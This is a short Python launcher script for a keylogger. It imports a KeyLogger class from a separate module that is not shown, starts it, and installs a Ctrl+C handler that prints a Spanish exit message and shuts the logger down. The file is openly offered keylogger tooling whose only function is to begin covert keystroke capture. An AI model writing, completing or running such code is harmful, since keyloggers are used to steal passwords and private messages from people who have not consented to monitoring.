from keylogger import KeyLogger
import signal
import sys

def def_handler(sig, frame):
    print("[!] Saliendo")
    my_keylogger.shutdown()
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = KeyLogger()
    my_keylogger.start()